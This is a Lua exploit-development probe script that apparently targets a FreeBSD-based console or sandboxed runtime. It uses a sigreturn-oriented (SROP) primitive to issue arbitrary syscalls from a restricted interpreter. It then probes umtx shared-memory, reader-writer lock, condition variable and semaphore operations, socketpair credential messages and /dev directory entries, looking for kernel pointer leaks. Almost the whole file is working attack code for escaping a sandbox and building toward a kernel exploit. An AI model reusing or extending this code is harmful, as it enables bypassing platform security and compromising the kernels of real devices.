-- CRASH_CLASS: LOW
-- PROBE 142r: UMTX_OP_SHM fd discovery + RW locks + sendmsg fix
--
-- 142q: SHM(25) returns 0 (works!), ROBUST_LISTS(26) blocked.
-- Need to find what fd SHM allocates. Also test RW lock ops and
-- fix sendmsg for socketpair data transfer.

print("=== PROBE 142r: SHM+RWLOCK ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)

local pid = to_num(sc20())
print("pid=" .. pid)

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))

local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local base_rip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    return rv
end

--------------------------------------------------------------------
-- [A] Find what fds exist before SHM, then after
-- fstat(189) returns 0 if fd is valid, -1 if invalid
--------------------------------------------------------------------
print("")
print("--- [A] SHM fd discovery ---")

local stat_buf = gpu + 0x1000

-- Check fds 0-35 before SHM
print("[A] fds before SHM:")
local before_fds = {}
for fd = 0, 35 do
    for off = 0, 0x7F, 4 do wd(stat_buf + off, 0) end
    local rv = srop(189, uint64(fd), ua(stat_buf), uint64(0))
    local rvh, rvl = get_hi_lo(rv)
    if rvl == 0 and rvh == 0 then
        before_fds[fd] = true
    end
end
local before_str = ""
for fd = 0, 35 do
    if before_fds[fd] then before_str = before_str .. fd .. " " end
end
print("[A] valid fds: " .. before_str)

-- Do SHM create with key=0x1234
local shm_key = gpu + 0x2000
wq(shm_key, uint64(0x1234))
local rv_shm = srop(454, ua(shm_key), uint64(25), uint64(1), uint64(0), uint64(0))
print("[A] SHM_CREAT ret=" .. hex(rv_shm))

-- Check fds again
print("[A] fds after SHM:")
local new_fds = {}
for fd = 0, 35 do
    for off = 0, 0x7F, 4 do wd(stat_buf + off, 0) end
    local rv = srop(189, uint64(fd), ua(stat_buf), uint64(0))
    local rvh, rvl = get_hi_lo(rv)
    if rvl == 0 and rvh == 0 then
        if not before_fds[fd] then
            new_fds[fd] = true
            print("[A] *** NEW fd after SHM: " .. fd .. " ***")

            -- Dump fstat data for the new fd
            for off = 0, 0x7F, 8 do
                local vq = safe_rq(stat_buf + off)
                if vq then
                    local qh, ql = get_hi_lo(vq)
                    if qh ~= 0 or ql ~= 0 then
                        print("[A]   fstat+" .. string.format("%02X", off) .. " = " .. hex(vq))
                    end
                    if qh >= 0xFFFF8000 then
                        print("[A]   *** KERNEL PTR at fstat+" .. string.format("%02X", off) .. " ***")
                    end
                end
            end
        end
    end
end

-- Do another SHM create with different key
wq(shm_key, uint64(0x5678))
local rv_shm2 = srop(454, ua(shm_key), uint64(25), uint64(1), uint64(0), uint64(0))
print("[A] SHM_CREAT(key2) ret=" .. hex(rv_shm2))

for fd = 0, 35 do
    if not before_fds[fd] and not new_fds[fd] then
        for off = 0, 0x7F, 4 do wd(stat_buf + off, 0) end
        local rv = srop(189, uint64(fd), ua(stat_buf), uint64(0))
        local rvh, rvl = get_hi_lo(rv)
        if rvl == 0 and rvh == 0 then
            print("[A] *** NEW fd after SHM2: " .. fd .. " ***")
        end
    end
end

-- SHM destroy (val=3)
wq(shm_key, uint64(0x1234))
local rv_shm_d = srop(454, ua(shm_key), uint64(25), uint64(3), uint64(0), uint64(0))
print("[A] SHM_DESTROY ret=" .. hex(rv_shm_d))

--------------------------------------------------------------------
-- [B] sendmsg with PLAIN data (no cmsg) on socketpair
--------------------------------------------------------------------
print("")
print("--- [B] Plain sendmsg/recvmsg ---")

local sp_fds = gpu + 0x3000
wd(sp_fds, 0xDEAD); wd(sp_fds + 4, 0xDEAD)
srop(135, uint64(1), uint64(1), uint64(0), ua(sp_fds))
local fd_a = safe_rd(sp_fds)
local fd_b = safe_rd(sp_fds + 4)
print("[B] socketpair: " .. (fd_a or "nil") .. ", " .. (fd_b or "nil"))

if fd_a and fd_a ~= 0xDEAD then
    -- iovec
    local sdata = gpu + 0x4000
    wd(sdata, 0x4D414742)  -- "BGAM"
    local siov = gpu + 0x4100
    wq(siov + 0x00, ua(sdata))
    wq(siov + 0x08, uint64(4))

    -- msghdr with NO cmsg
    local smsg = gpu + 0x4200
    wq(smsg + 0x00, uint64(0))     -- msg_name = NULL
    wd(smsg + 0x08, 0)              -- msg_namelen
    wd(smsg + 0x0C, 0)              -- padding
    wq(smsg + 0x10, ua(siov))       -- msg_iov
    wd(smsg + 0x18, 1)              -- msg_iovlen
    wd(smsg + 0x1C, 0)              -- padding
    wq(smsg + 0x20, uint64(0))      -- msg_control = NULL
    wd(smsg + 0x28, 0)              -- msg_controllen = 0
    wd(smsg + 0x2C, 0)              -- msg_flags

    local rv_send = srop(28, uint64(fd_a), ua(smsg), uint64(0))
    local rsh, rsl = get_hi_lo(rv_send)
    print("[B] sendmsg ret=" .. hex(rv_send))

    if rsl == 4 or (rsl == 0 and rsh == 0) then
        -- recvmsg with large control buffer (kernel may auto-fill)
        local rdata = gpu + 0x5000
        wd(rdata, 0)
        local riov = gpu + 0x5100
        wq(riov + 0x00, ua(rdata))
        wq(riov + 0x08, uint64(128))

        -- Receive cmsg buffer filled with sentinel
        local rcmsg = gpu + 0x5200
        for off = 0, 0xFF, 4 do wd(rcmsg + off, 0xCCCCCCCC) end

        local rmsg = gpu + 0x5300
        wq(rmsg + 0x00, uint64(0))
        wd(rmsg + 0x08, 0)
        wd(rmsg + 0x0C, 0)
        wq(rmsg + 0x10, ua(riov))
        wd(rmsg + 0x18, 1)
        wd(rmsg + 0x1C, 0)
        wq(rmsg + 0x20, ua(rcmsg))
        wd(rmsg + 0x28, 256)
        wd(rmsg + 0x2C, 0)

        local rv_recv = srop(27, uint64(fd_b), ua(rmsg), uint64(0))
        print("[B] recvmsg ret=" .. hex(rv_recv))

        local rd0 = safe_rd(rdata)
        print("[B] recv_data=0x" .. string.format("%08X", rd0 or 0))

        -- Check controllen (how much cmsg kernel returned)
        local rclen = safe_rd(rmsg + 0x28)
        print("[B] returned controllen=" .. (rclen or "nil"))

        -- If kernel returned any cmsg, dump it
        if rclen and rclen > 0 then
            print("[B] cmsg from kernel:")
            for off = 0, math.min(rclen - 1, 0xFF), 4 do
                local v = safe_rd(rcmsg + off)
                if v and v ~= 0xCCCCCCCC then
                    print("[B]  +" .. string.format("%02X", off) .. " = 0x" .. string.format("%08X", v))
                end
            end
        end

        -- Now try setsockopt LOCAL_CREDS before recvmsg
        -- setsockopt(54): (fd, level, optname, optval, optlen)
        -- Try level=0 (SOL_LOCAL) or level=0xFFFF (SOL_SOCKET)
        local optval = gpu + 0x5400
        wd(optval, 1)  -- enable

        -- Try LOCAL_CREDS (2) at level 0
        local rv_so1 = srop(105, uint64(fd_b), uint64(0), uint64(2), ua(optval), uint64(4))
        print("[B] setsockopt(LOCAL_CREDS,level=0) ret=" .. hex(rv_so1))

        -- Try at level 0xFFFF
        local rv_so2 = srop(105, uint64(fd_b), uint64(0xFFFF), uint64(2), ua(optval), uint64(4))
        print("[B] setsockopt(LOCAL_CREDS,level=0xFFFF) ret=" .. hex(rv_so2))

        -- Send again
        wd(sdata, 0x54534554)  -- "TEST"
        rv_send = srop(28, uint64(fd_a), ua(smsg), uint64(0))
        print("[B] sendmsg2 ret=" .. hex(rv_send))

        -- Recv again with cmsg
        for off = 0, 0xFF, 4 do wd(rcmsg + off, 0xCCCCCCCC) end
        wd(rmsg + 0x28, 256)
        wd(rmsg + 0x2C, 0)
        rv_recv = srop(27, uint64(fd_b), ua(rmsg), uint64(0))
        print("[B] recvmsg2 ret=" .. hex(rv_recv))
        rclen = safe_rd(rmsg + 0x28)
        print("[B] returned controllen2=" .. (rclen or "nil"))

        if rclen and rclen > 0 then
            print("[B] *** KERNEL FILLED cmsg! ***")
            for off = 0, math.min(rclen - 1, 0xFF), 4 do
                local v = safe_rd(rcmsg + off)
                if v and v ~= 0xCCCCCCCC then
                    print("[B]  +" .. string.format("%02X", off) .. " = 0x" .. string.format("%08X", v))
                end
            end
            -- Check for kernel pointers
            for off = 0, math.min(rclen - 1, 0xF8), 8 do
                local vq = safe_rq(rcmsg + off)
                if vq then
                    local qh, ql = get_hi_lo(vq)
                    if qh >= 0xFFFF8000 then
                        print("[B] *** KERNEL PTR: " .. hex(vq) .. " at +" .. string.format("%02X", off) .. " ***")
                    end
                end
            end
        end
    end
end

--------------------------------------------------------------------
-- [C] UMTX RW lock operations (19/20/21)
-- These use complex kernel reader-writer lock code
--------------------------------------------------------------------
print("")
print("--- [C] RW lock ops ---")

-- FreeBSD urwlock structure (user-space part):
-- +0x00: rw_state (int32) — lock state
-- +0x04: rw_flags (int32) — flags
-- +0x08: rw_blocked_readers (int32) — count
-- +0x0C: rw_blocked_writers (int32) — count

local rwlock = gpu + 0x6000
wd(rwlock + 0x00, 0)   -- rw_state = unlocked
wd(rwlock + 0x04, 0)   -- rw_flags
wd(rwlock + 0x08, 0)   -- blocked_readers
wd(rwlock + 0x0C, 0)   -- blocked_writers

-- UMTX_OP_RW_RDLOCK (19): acquire read lock
local rv_rdl = srop(454, ua(rwlock), uint64(19), uint64(0), uint64(0), uint64(0))
print("[C] RW_RDLOCK ret=" .. hex(rv_rdl))
local rw_state1 = safe_rd(rwlock)
print("[C] rw_state after rdlock=" .. (rw_state1 or "nil"))

-- UMTX_OP_RW_UNLOCK (21): release lock
local rv_rwu = srop(454, ua(rwlock), uint64(21), uint64(0), uint64(0), uint64(0))
print("[C] RW_UNLOCK ret=" .. hex(rv_rwu))
local rw_state2 = safe_rd(rwlock)
print("[C] rw_state after unlock=" .. (rw_state2 or "nil"))

-- UMTX_OP_RW_WRLOCK (20): acquire write lock
local rv_wrl = srop(454, ua(rwlock), uint64(20), uint64(0), uint64(0), uint64(0))
print("[C] RW_WRLOCK ret=" .. hex(rv_wrl))
local rw_state3 = safe_rd(rwlock)
print("[C] rw_state after wrlock=" .. (rw_state3 or "nil"))

-- UMTX_OP_RW_UNLOCK after wrlock
local rv_rwu2 = srop(454, ua(rwlock), uint64(21), uint64(0), uint64(0), uint64(0))
print("[C] RW_UNLOCK2 ret=" .. hex(rv_rwu2))
local rw_state4 = safe_rd(rwlock)
print("[C] rw_state after unlock2=" .. (rw_state4 or "nil"))

-- Dump full rwlock state
print("[C] rwlock dump:")
for off = 0, 0x1F, 4 do
    local v = safe_rd(rwlock + off)
    if v and v ~= 0 then
        print("[C]  +" .. string.format("%02X", off) .. " = 0x" .. string.format("%08X", v))
    end
end

--------------------------------------------------------------------
-- [D] Condition variable ops (15/16/17)
--------------------------------------------------------------------
print("")
print("--- [D] CV ops ---")

-- FreeBSD ucond structure:
-- +0x00: c_has_waiters (int32)
-- +0x04: c_flags (int32)
-- +0x08: c_clockid (int32)
-- +0x0C: c_spare[1] (int32)

local cond = gpu + 0x7000
wd(cond + 0x00, 0)  -- no waiters
wd(cond + 0x04, 0)  -- flags
wd(cond + 0x08, 0)  -- CLOCK_REALTIME
wd(cond + 0x0C, 0)

-- CV_SIGNAL (16): signal one waiter
local rv_cvs = srop(454, ua(cond), uint64(16), uint64(0), uint64(0), uint64(0))
print("[D] CV_SIGNAL ret=" .. hex(rv_cvs))

-- CV_BROADCAST (17): wake all waiters
local rv_cvb = srop(454, ua(cond), uint64(17), uint64(0), uint64(0), uint64(0))
print("[D] CV_BROADCAST ret=" .. hex(rv_cvb))

-- UMTX_OP_MUTEX_WAKE2 (27): complex wake logic
local wake2_futex = gpu + 0x8000
wq(wake2_futex, uint64(0))

local rv_w2 = srop(454, ua(wake2_futex), uint64(27), uint64(0), uint64(0), uint64(0))
print("[D] MUTEX_WAKE2 ret=" .. hex(rv_w2))

-- UMTX_OP_SEM2_WAIT (24) and SEM2_WAKE (28)
local sem2 = gpu + 0x8100
wd(sem2 + 0x00, 1)  -- count = 1 (available)
wd(sem2 + 0x04, 0)  -- flags

-- SEM2_WAIT (should consume the count)
local rv_sw = srop(454, ua(sem2), uint64(24), uint64(0), uint64(0), uint64(0))
print("[D] SEM2_WAIT(count=1) ret=" .. hex(rv_sw))
local sem_after = safe_rd(sem2)
print("[D] sem count after wait=" .. (sem_after or "nil"))

-- SEM2_WAKE
local rv_swk = srop(454, ua(sem2), uint64(28), uint64(0), uint64(0), uint64(0))
print("[D] SEM2_WAKE ret=" .. hex(rv_swk))
local sem_after2 = safe_rd(sem2)
print("[D] sem count after wake=" .. (sem_after2 or "nil"))

--------------------------------------------------------------------
-- [E] Try open("/dev") + getdirentries for inode data
--------------------------------------------------------------------
print("")
print("--- [E] Open /dev ---")

-- Put "/dev\0" in GPU memory
local devpath = gpu + 0x9000
wd(devpath, 0x7665642F)  -- "/dev"
wd(devpath + 4, 0)        -- null terminator

-- open("/dev", O_RDONLY=0) = sys 5
local rv_open = srop(5, ua(devpath), uint64(0), uint64(0))
local oh, ol = get_hi_lo(rv_open)
print("[E] open(/dev) ret=" .. hex(rv_open))

if ol >= 0 and ol < 256 and oh == 0 then
    local dev_fd = ol
    print("[E] /dev fd=" .. dev_fd)

    -- getdirentries(196): (fd, buf, nbytes, basep)
    local dent_buf = gpu + 0xA000
    for off = 0, 0x3FF, 4 do wd(dent_buf + off, 0) end
    local basep = gpu + 0xA400
    wq(basep, uint64(0))

    local rv_gd = srop(196, uint64(dev_fd), ua(dent_buf), uint64(0x400), ua(basep))
    local gdh, gdl = get_hi_lo(rv_gd)
    print("[E] getdirentries ret=" .. hex(rv_gd))

    if gdl > 0 then
        print("[E] got " .. gdl .. " bytes of dir entries")
        -- Parse directory entries
        -- struct dirent:
        -- +0x00: d_fileno (uint32/uint64)
        -- +0x08: d_reclen (uint16)
        -- +0x0A: d_type (uint8)
        -- +0x0B: d_namlen (uint8)
        -- +0x0C: d_name[] (variable)
        local pos = 0
        local count = 0
        while pos < gdl and count < 20 do
            local ino = safe_rq(dent_buf + pos)
            local reclen_raw = safe_rd(dent_buf + pos + 8)
            if not reclen_raw then break end
            local reclen = reclen_raw % 65536
            local d_type = math.floor(reclen_raw / 65536) % 256
            local d_namlen = math.floor(reclen_raw / 16777216) % 256

            if reclen == 0 then break end

            -- Read name
            local name = ""
            for ci = 0, math.min(d_namlen - 1, 15) do
                local cb = safe_rd(dent_buf + pos + 12 + ci - (ci % 4))
                if cb then
                    local shift = (ci % 4) * 8
                    local ch = math.floor(cb / (2^shift)) % 256
                    if ch >= 32 and ch < 127 then
                        name = name .. string.char(ch)
                    end
                end
            end

            if ino then
                local ih, il = get_hi_lo(ino)
                if ih >= 0xFFFF8000 then
                    print("[E] *** KERNEL INODE: " .. name .. " ino=" .. hex(ino) .. " ***")
                else
                    if count < 10 then
                        print("[E]  " .. name .. " ino=" .. hex(ino) .. " type=" .. d_type)
                    end
                end
            end

            pos = pos + reclen
            count = count + 1
        end
        if count >= 10 then
            print("[E]  ... (" .. count .. " entries total)")
        end
    end

    -- Close the fd
    srop(6, uint64(dev_fd))
end

print("")
print("=== DONE ===")
